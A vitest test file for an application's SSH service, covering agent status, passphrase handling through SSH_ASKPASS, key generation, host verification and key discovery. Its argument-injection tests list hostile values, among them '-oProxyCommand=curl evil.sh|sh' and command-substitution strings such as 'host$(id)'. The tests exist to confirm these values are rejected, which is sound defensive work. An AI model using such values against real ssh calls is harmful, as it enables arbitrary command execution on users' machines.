import { mkdtemp, readFile, rm, writeFile, mkdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { FakeProcessRunner } from "../../helpers/fake-process-runner";
import { sshFixtures as fx } from "../../fixtures/ssh-output";
import { SshService } from "@main/ssh/ssh-service";
import type {
  ProcessRequest,
  ProcessResult,
  ProcessRunner,
} from "@main/git/execution/process-runner";

let tempHome: string | undefined;

const makeHome = async () => {
  const home = await mkdtemp(join(tmpdir(), "eda-ssh-"));
  await mkdir(join(home, ".ssh"), { recursive: true });
  tempHome = home;
  return home;
};

afterEach(async () => {
  if (tempHome) await rm(tempHome, { recursive: true, force: true });
  tempHome = undefined;
});

describe("SshService agent status", () => {
  it("reports the keys the agent holds", async () => {
    const runner = new FakeProcessRunner().on(["-l"], { stdout: fx.agentTwoKeys });
    const status = await new SshService(runner, "/home/test").getAgentStatus();

    expect(status.available).toBe(true);

    if (status.available) {
      expect(status.keys.map((k) => k.comment)).toEqual([
        "work@eda.invalid",
        "personal@eda.invalid",
      ]);
    }
  });

  it("treats an empty agent as available with no keys", async () => {
    const runner = new FakeProcessRunner().on(["-l"], { exitCode: 1, stderr: fx.agentEmpty });
    const status = await new SshService(runner, "/home/test").getAgentStatus();

    expect(status.available).toBe(true);
    if (status.available) expect(status.keys).toEqual([]);
  });

  it("reports no agent running as unavailable", async () => {
    const runner = new FakeProcessRunner().on(["-l"], { exitCode: 2, stderr: fx.agentUnreachable });
    const status = await new SshService(runner, "/home/test").getAgentStatus();

    expect(status.available).toBe(false);
    if (!status.available) expect(status.reason).toMatch(/no system ssh agent/i);
  });
});

describe("SshService unlock", () => {
  it("never puts the passphrase in the command line", async () => {
    const runner = new FakeProcessRunner()
      .on(["-l"], { stdout: fx.agentOneKey })
      .otherwise({ exitCode: 0, stdout: fx.agentAdded });

    await new SshService(runner, "/home/test").unlockKey(
      { keyPath: "/keys/id_ed25519" },
      "hunter2",
    );

    for (const call of runner.calls) {
      expect(call.args.join(" ")).not.toContain("hunter2");
      expect(JSON.stringify(call.env)).not.toContain("hunter2");
    }
  });

  it("passes the passphrase through SSH_ASKPASS instead", async () => {
    const runner = new FakeProcessRunner()
      .on(["-l"], { stdout: fx.agentOneKey })
      .otherwise({ exitCode: 0 });

    await new SshService(runner, "/home/test").unlockKey(
      { keyPath: "/keys/id_ed25519" },
      "hunter2",
    );

    const addCall = runner.calls.find((c) => c.args.includes("/keys/id_ed25519"));

    expect(addCall?.env["SSH_ASKPASS"]).toBeDefined();
    expect(addCall?.env["SSH_ASKPASS_REQUIRE"]).toBe("force");
  });

  it("keeps the passphrase in a data file rather than executable helper code", async () => {
    let helper = "";
    const runner: ProcessRunner = {
      async run(request: ProcessRequest): Promise<ProcessResult> {
        if (request.executable === "ssh-add" && request.args[0] !== "-l") {
          helper = await readFile(request.env["SSH_ASKPASS"]!, "utf8");
        }
        return { exitCode: 0, stdout: Buffer.alloc(0), stderr: Buffer.alloc(0), cancelled: false };
      },
    };

    await new SshService(runner, "/home/test").unlockKey(
      { keyPath: "/keys/id_ed25519" },
      "$(touch /tmp/never-execute)",
    );

    expect(helper.length).toBeGreaterThan(0);
    expect(helper).not.toContain("$(touch /tmp/never-execute)");
  });

  it("passes an optional lifetime so a work key does not stay live all day", async () => {
    const runner = new FakeProcessRunner()
      .on(["-l"], { stdout: fx.agentOneKey })
      .otherwise({ exitCode: 0 });

    await new SshService(runner, "/home/test").unlockKey(
      { keyPath: "/keys/id_ed25519", lifetimeSeconds: 3600 },
      "hunter2",
    );

    const addCall = runner.calls.find((c) => c.args.includes("/keys/id_ed25519"));

    expect(addCall?.args).toEqual(expect.arrayContaining(["-t", "3600"]));
  });

  it("reports a wrong passphrase without echoing anything secret", async () => {
    const runner = new FakeProcessRunner()
      .on(["-l"], { stdout: fx.agentOneKey })
      .otherwise({ exitCode: 1, stderr: "Bad passphrase, try again for /keys/id_ed25519: \n" });

    const service = new SshService(runner, "/home/test");
    const failure = await service
      .unlockKey({ keyPath: "/keys/id_ed25519" }, "wrong")
      .catch((error: unknown) => error);

    expect(failure).toMatchObject({ kind: "auth-failed" });
    expect(JSON.stringify(failure)).not.toContain("wrong");
    expect((failure as { rawStderr?: string }).rawStderr).toBeUndefined();
  });

  it("refuses to unlock when no agent is running", async () => {
    const runner = new FakeProcessRunner().on(["-l"], { exitCode: 2, stderr: fx.agentUnreachable });

    await expect(
      new SshService(runner, "/home/test").unlockKey({ keyPath: "/keys/id_ed25519" }, "hunter2"),
    ).rejects.toMatchObject({ kind: "invalid-input" });
  });
});

describe("SshService generation", () => {
  it("refuses to overwrite an existing key", async () => {
    const home = await makeHome();
    const keyPath = join(home, ".ssh", "existing");

    await writeFile(keyPath, "PRETEND KEY", "utf8");

    const runner = new FakeProcessRunner().otherwise({ exitCode: 0 });

    await expect(
      new SshService(runner, home).generateKey({
        path: keyPath,
        type: "ed25519",
        comment: "x@y.z",
      }),
    ).rejects.toMatchObject({ kind: "invalid-input" });

    expect(runner.calls).toHaveLength(0);
  });

  it("refuses to overwrite an existing public-key half", async () => {
    const home = await makeHome();
    const keyPath = join(home, ".ssh", "existing-public-half");

    await writeFile(`${keyPath}.pub`, fx.publicKeyEd25519, "utf8");

    const runner = new FakeProcessRunner().otherwise({ exitCode: 0 });

    await expect(
      new SshService(runner, home).generateKey({
        path: keyPath,
        type: "ed25519",
        comment: "x@y.z",
      }),
    ).rejects.toMatchObject({ kind: "invalid-input" });
    expect(runner.calls).toHaveLength(0);
  });

  it("generates with an explicit empty passphrase rather than prompting", async () => {
    const home = await makeHome();
    const keyPath = join(home, ".ssh", "fresh");
    const runner = new FakeProcessRunner().otherwise({ exitCode: 0, stdout: "" });

    await new SshService(runner, home)
      .generateKey({ path: keyPath, type: "ed25519", comment: "dev@example.com" })
      .catch(() => undefined);

    const args = runner.calls[0]?.args ?? [];

    expect(args).toEqual(expect.arrayContaining(["-t", "ed25519", "-f"]));
    expect(args[args.indexOf("-f") + 1]).toContain(".eda-key-");
    expect(args).toEqual(expect.arrayContaining(["-N", ""]));
  });

  it("defaults RSA to 4096 bits", async () => {
    const home = await makeHome();
    const runner = new FakeProcessRunner().otherwise({ exitCode: 0 });

    await new SshService(runner, home)
      .generateKey({ path: join(home, ".ssh", "rsa_key"), type: "rsa", comment: "x@y.z" })
      .catch(() => undefined);

    expect(runner.calls[0]?.args).toEqual(expect.arrayContaining(["-b", "4096"]));
  });
});

describe("SshService argument-injection defenses", () => {
  const service = () =>
    new SshService(new FakeProcessRunner().otherwise({ exitCode: 0 }), "/home/test");

  it.each([
    "-oProxyCommand=touch /tmp/pwned",
    "-oProxyCommand=curl evil.sh|sh",
    "--option=x",
    "-F/tmp/evil_ssh_config",
    "-V@github.com",
    "-F@github.com",
  ])("refuses the option-like host %s", async (host) => {
    const runner = new FakeProcessRunner().otherwise({ exitCode: 0 });

    await expect(
      new SshService(runner, "/home/test").testConnection(host, "/keys/id_ed25519"),
    ).rejects.toMatchObject({ kind: "invalid-input" });
    expect(runner.calls).toHaveLength(0);
  });

  it("never spawns a process for a rejected host", async () => {
    const runner = new FakeProcessRunner().otherwise({ exitCode: 0 });
    await new SshService(runner, "/home/test")
      .testConnection("-oProxyCommand=touch /tmp/pwned", "/keys/k")
      .catch(() => undefined);

    expect(runner.calls).toHaveLength(0);
  });

  it.each([
    "github.com",
    "git@github.com",
    "git@github.com:2222",
    "gitlab.internal.example.org",
    "build-01",
  ])("accepts the ordinary host %s", async (host) => {
    await expect(service().testConnection(host, "/keys/id_ed25519")).resolves.toBeDefined();
  });

  it.each(["host with spaces", "host;touch /tmp/x", "host$(id)", "host`id`", "host&&id"])(
    "refuses the malformed host %s",
    async (host) => {
      await expect(service().testConnection(host, "/keys/k")).rejects.toMatchObject({
        kind: "invalid-input",
      });
    },
  );

  it("refuses an out-of-range port", async () => {
    await expect(service().testConnection("github.com:99999", "/keys/k")).rejects.toMatchObject({
      kind: "invalid-input",
    });
  });

  it("refuses an option-like key path everywhere it reaches argv", async () => {
    const evil = "-oProxyCommand=touch /tmp/pwned";

    await expect(service().testConnection("github.com", evil)).rejects.toMatchObject({
      kind: "invalid-input",
    });
    await expect(service().unlockKey({ keyPath: evil }, "pass")).rejects.toMatchObject({
      kind: "invalid-input",
    });
    await expect(service().lockKey(evil)).rejects.toMatchObject({ kind: "invalid-input" });
    await expect(service().importKey(evil)).rejects.toMatchObject({ kind: "invalid-input" });
    await expect(
      service().generateKey({ path: evil, type: "ed25519", comment: "x@y.z" }),
    ).rejects.toMatchObject({ kind: "invalid-input" });
  });

  it("refuses an option-like comment, which also lands in argv", async () => {
    await expect(
      service().generateKey({ path: "/keys/new", type: "ed25519", comment: "-oProxyCommand=id" }),
    ).rejects.toMatchObject({ kind: "invalid-input" });
  });

  it("skips a discovered file whose name would be read as a flag", async () => {
    const home = await makeHome();

    await writeFile(join(home, ".ssh", "-oProxyCommand=id"), "x", "utf8");
    await writeFile(join(home, ".ssh", "-oProxyCommand=id.pub"), fx.publicKeyEd25519, "utf8");

    const runner = new FakeProcessRunner()
      .when((r) => r.executable === "ssh-add", { exitCode: 1, stderr: fx.agentEmpty })
      .otherwise({ exitCode: 0, stdout: fx.fingerprintEd25519 });

    expect(await new SshService(runner, home).discoverKeys()).toEqual([]);
  });
});

describe("SshService connection test", () => {
  it("passes a host port through -p instead of appending it to the hostname", async () => {
    const runner = new FakeProcessRunner().otherwise({ exitCode: 0 });

    await new SshService(runner, "/home/test").testConnection("git@example.com:2222", "/keys/k");

    expect(runner.lastCall?.args).toEqual(
      expect.arrayContaining(["-p", "2222", "git@example.com"]),
    );
    expect(runner.lastCall?.args).not.toContain("git@example.com:2222");
  });

  it("pins the key so the agent cannot answer as a different identity", async () => {
    const runner = new FakeProcessRunner().otherwise({ exitCode: 1, stderr: fx.githubGreeting });

    await new SshService(runner, "/home/test").testConnection(
      "git@github.com",
      "/keys/work_ed25519",
    );

    const args = runner.lastCall?.args ?? [];

    expect(args).toEqual(expect.arrayContaining(["-o", "IdentitiesOnly=yes"]));
    expect(args).toEqual(expect.arrayContaining(["-i", "/keys/work_ed25519"]));
    expect(args).toEqual(expect.arrayContaining(["-o", "BatchMode=no"]));
    expect(args).toEqual(expect.arrayContaining(["-o", "StrictHostKeyChecking=ask"]));
    expect(args).toContain("PasswordAuthentication=no");
    expect(args).toContain("KbdInteractiveAuthentication=no");
    expect(runner.lastCall?.env["EDA_SSH_HOST_TRUST"]).toBe("1");
  });

  it("reports the account the host says you are", async () => {
    const runner = new FakeProcessRunner().otherwise({ exitCode: 1, stderr: fx.githubGreeting });
    const result = await new SshService(runner, "/home/test").testConnection(
      "git@github.com",
      "/keys/k",
    );

    expect(result.reachable).toBe(true);
    expect(result.status).toBe("authenticated");
    expect(result.authenticatedAs).toBe("eda");
  });

  it.each([
    [
      "No ED25519 host key is known for example.com and you have requested strict checking.\nHost key verification failed.",
      "host-key-unknown",
    ],
    [
      "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!\nHost key verification failed.",
      "host-key-changed",
    ],
    ["Host key verification failed.", "host-key-unverified"],
  ])("distinguishes host verification failures: %s", async (stderr, status) => {
    const runner = new FakeProcessRunner().otherwise({ exitCode: 255, stderr });
    const result = await new SshService(runner, "/home/test").testConnection(
      "git@example.com",
      "/keys/k",
    );

    expect(result.reachable).toBe(false);
    expect(result.status).toBe(status);
    expect(result.authenticatedAs).toBeUndefined();
    if (status === "host-key-unknown") {
      expect(result.message).toContain("trust dialog");
    } else {
      expect(result.message).toMatch(/verify its fingerprint/i);
      expect(result.message).toContain("known_hosts");
      expect(result.message).not.toContain("unknown or has changed");
    }
  });

  it("enables the same modal host verification for custom ports", async () => {
    const runner = new FakeProcessRunner().otherwise({
      exitCode: 255,
      stderr:
        "No ED25519 host key is known for [example.com]:2222 and you have requested strict checking.",
    });
    const result = await new SshService(runner, "/home/test").testConnection(
      "git@example.com:2222",
      "/keys/k",
    );

    expect(result.status).toBe("host-key-unknown");
    expect(runner.calls).toHaveLength(1);
    expect(runner.lastCall?.args).toContain("StrictHostKeyChecking=ask");
    expect(runner.lastCall?.args).toEqual(
      expect.arrayContaining(["-p", "2222", "git@example.com"]),
    );
  });

  it("reports a rejected key as reachable but refused", async () => {
    const runner = new FakeProcessRunner().otherwise({
      exitCode: 255,
      stderr: "git@github.com: Permission denied (publickey).\n",
    });
    const result = await new SshService(runner, "/home/test").testConnection(
      "git@github.com",
      "/keys/k",
    );

    expect(result.reachable).toBe(true);
    expect(result.status).toBe("key-rejected");
    expect(result.authenticatedAs).toBeUndefined();
    expect(result.message).toMatch(/refused/i);
  });

  it("reports an unreachable host", async () => {
    const runner = new FakeProcessRunner().otherwise({
      exitCode: 255,
      stderr: "ssh: Could not resolve hostname nope.invalid\n",
    });
    const result = await new SshService(runner, "/home/test").testConnection(
      "git@nope.invalid",
      "/keys/k",
    );

    expect(result.reachable).toBe(false);
    expect(result.status).toBe("unreachable");
  });
});

describe("SshService discovery", () => {
  it("returns nothing when there is no ~/.ssh", async () => {
    const runner = new FakeProcessRunner().otherwise({ exitCode: 0 });
    expect(await new SshService(runner, "/nonexistent-home").discoverKeys()).toEqual([]);
  });

  it("ignores files with no matching private key", async () => {
    const home = await makeHome();

    await writeFile(join(home, ".ssh", "known_hosts"), "github.com ssh-ed25519 AAAA\n", "utf8");
    await writeFile(join(home, ".ssh", "config"), "Host *\n", "utf8");
    await writeFile(join(home, ".ssh", "orphan.pub"), fx.publicKeyEd25519, "utf8");

    const runner = new FakeProcessRunner()
      .when((r) => r.executable === "ssh-add", { exitCode: 1, stderr: fx.agentEmpty })
      .otherwise({ exitCode: 0 });

    expect(await new SshService(runner, home).discoverKeys()).toEqual([]);
  });

  it("reads a key pair without opening the private key file", async () => {
    const home = await makeHome();
    const keyPath = join(home, ".ssh", "id_ed25519");

    await writeFile(keyPath, "-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n", { mode: 0o600 });
    await writeFile(`${keyPath}.pub`, fx.publicKeyEd25519, "utf8");

    const runner = new FakeProcessRunner()
      .when((r) => r.executable === "ssh-add", { exitCode: 1, stderr: fx.agentEmpty })
      .on(["-l", "-f"], { stdout: fx.fingerprintEd25519 })
      .on(["-y"], { stdout: fx.probeUnencrypted });

    const keys = await new SshService(runner, home).discoverKeys();

    expect(keys).toHaveLength(1);
    expect(keys[0]?.fingerprint).toBe("SHA256:RXm/ruZ0eTzRXKwi1AQEDynB0VgHQ2ac9KPSFdf/YnA");
    expect(keys[0]?.encrypted).toBe(false);
    expect(keys[0]?.publicKey).toBe(fx.publicKeyEd25519);
    expect(JSON.stringify(keys[0])).not.toContain("BEGIN OPENSSH PRIVATE KEY");
  });

  it("marks a passphrase-protected key as encrypted", async () => {
    const home = await makeHome();
    const keyPath = join(home, ".ssh", "locked");

    await writeFile(keyPath, "encrypted-key-bytes", { mode: 0o600 });
    await writeFile(`${keyPath}.pub`, fx.publicKeyEd25519, "utf8");

    const runner = new FakeProcessRunner()
      .when((r) => r.executable === "ssh-add", { exitCode: 1, stderr: fx.agentEmpty })
      .on(["-l", "-f"], { stdout: fx.fingerprintEd25519 })
      .on(["-y"], { exitCode: 1, stderr: fx.probeEncrypted });

    const keys = await new SshService(runner, home).discoverKeys();

    expect(keys[0]?.encrypted).toBe(true);
  });

  it("refuses to import a public key by mistake", async () => {
    const home = await makeHome();
    const pubPath = join(home, ".ssh", "id_ed25519.pub");

    await writeFile(pubPath, fx.publicKeyEd25519, "utf8");

    const runner = new FakeProcessRunner().otherwise({ exitCode: 0 });

    await expect(new SshService(runner, home).importKey(pubPath)).rejects.toMatchObject({
      kind: "invalid-input",
    });
  });
});
